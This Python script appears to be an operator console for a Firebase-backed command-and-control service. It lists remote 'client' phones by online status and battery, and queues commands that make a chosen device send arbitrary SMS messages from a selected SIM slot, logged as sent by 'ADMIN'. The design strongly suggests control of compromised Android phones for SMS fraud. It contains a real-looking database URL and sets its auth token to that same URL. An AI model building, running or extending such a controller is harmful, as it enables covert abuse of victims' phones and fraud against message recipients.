import httpx
import time
import random
import string
from typing import Dict, Optional

FIREBASE_URL = "https://vdgsh-623ed-default-rtdb.firebaseio.com"
AUTH_TOKEN = "https://vdgsh-623ed-default-rtdb.firebaseio.com"

def _build_url(path: str) -> str:
    return f"{FIREBASE_URL}/{path}.json?auth={AUTH_TOKEN}"

def get(path: str) -> dict:
    resp = httpx.get(_build_url(path))
    resp.raise_for_status()
    return resp.json() if resp.content else {}

def put(path: str, data: dict) -> None:
    resp = httpx.put(_build_url(path), json=data)
    resp.raise_for_status()

def delete(path: str) -> None:
    resp = httpx.delete(_build_url(path))
    resp.raise_for_status()

def get_all_clients() -> Dict[str, dict]:
    return get("clients")

def get_online_clients(clients: Dict[str, dict]) -> Dict[str, dict]:
    return {cid: data for cid, data in clients.items() if data.get("status") == True}

def clear_webhook_event(client_id: str) -> None:
    try:
        delete(f"clients/{client_id}/webhookEvent")
        print(f"✅ Cleared existing webhookEvent for {client_id}")
    except httpx.HTTPStatusError as e:
        if e.response.status_code != 404:
            raise

def send_sms_command(client_id: str, to: str, message: str, sim_slot: int = 0) -> str:
    command_id = f"cmd_{int(time.time()*1000)}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
    payload = {
        "sendSms": {
            "from": sim_slot,
            "to": to,
            "message": message,
            "isSended": False,
            "status": "pending",
            "timestamp": int(time.time() * 1000),
            "commandId": command_id,
        }
    }
    put(f"clients/{client_id}/webhookEvent", payload)
    return command_id

def log_outgoing(client_id: str, to: str, message: str, command_id: str) -> None:
    log_entry = {
        "commandId": command_id,
        "targetNumber": to,
        "message": message,
        "timestamp": int(time.time() * 1000),
        "status": "pending",
        "type": "outgoing",
        "sender": "ADMIN"
    }
    url = _build_url(f"clients/{client_id}/messages")
    resp = httpx.post(url, json=log_entry)
    resp.raise_for_status()

def main():
    print("📡 Fetching all clients...")
    clients = get_all_clients()
    if not clients:
        print("❌ No clients found.")
        return

    online = get_online_clients(clients)
    if not online:
        print("❌ No online clients (status: true) found.")
        return

    print(f"\n✅ Found {len(online)} online clients:")
    client_ids = list(online.keys())
    for idx, cid in enumerate(client_ids, 1):
        data = online[cid]
        battery = data.get("battery", "N/A")
        last = data.get("lastMessageTime", "N/A")
        print(f"  {idx}. {cid}  (battery: {battery}, lastMsg: {last})")

    while True:
        choice = input("\n📋 Select client by number (1..n) or paste full client ID: ").strip()
        if choice.lower() == 'q':
            return

        # Try as integer index
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(client_ids):
                client_id = client_ids[idx]
                break
            else:
                print("❌ Invalid number. Please choose between 1 and", len(client_ids))
                continue
        else:
            # Treat as client ID
            clean = choice.strip(' "\'')
            if clean in online:
                client_id = clean
                break
            else:
                print("❌ Client ID not found in online list. Please try again.")
                continue

    # Now get message details
    print("\n--- Enter SMS details ---")
    while True:
        to = input("📱 Recipient phone (E.164, e.g., +919876543210): ").strip()
        if to.startswith('+') and to[1:].isdigit():
            break
        print("❌ Invalid format. Use + and country code, e.g., +919876543210")

    message = input("✉️  Message: ").strip()
    if not message:
        print("⚠️  Message empty, using 'Test message'")
        message = "Test message"

    sim_slot = input("📶 SIM slot (0 or 1, default 0): ").strip()
    sim_slot = int(sim_slot) if sim_slot in ('0','1') else 0

    # Send
    print(f"\n🚀 Sending to client {client_id} ...")
    clear_webhook_event(client_id)
    command_id = send_sms_command(client_id, to, message, sim_slot)
    log_outgoing(client_id, to, message, command_id)

    print(f"✅ Command queued! ID: {command_id}")
    print(f"🔍 Check status: https://vdgsh-623ed-default-rtdb.firebaseio.com/clients/{client_id}/webhookEvent.json?auth=...")

    monitor = input("\n🔍 Monitor until processed? (y/n): ").strip().lower()
    if monitor == 'y':
        for _ in range(10):
            time.sleep(3)
            try:
                event = get(f"clients/{client_id}/webhookEvent")
                if event is None:
                    print("✅ Command executed (webhookEvent deleted).")
                    return
                if event.get("sendSms", {}).get("isSended") == True:
                    print("✅ Command executed (isSended: true).")
                    return
                print("⏳ Still pending...")
            except Exception:
                print("⏳ Still pending...")
        print("⏳ Timed out. Check device manually.")

if __name__ == "__main__":
    main()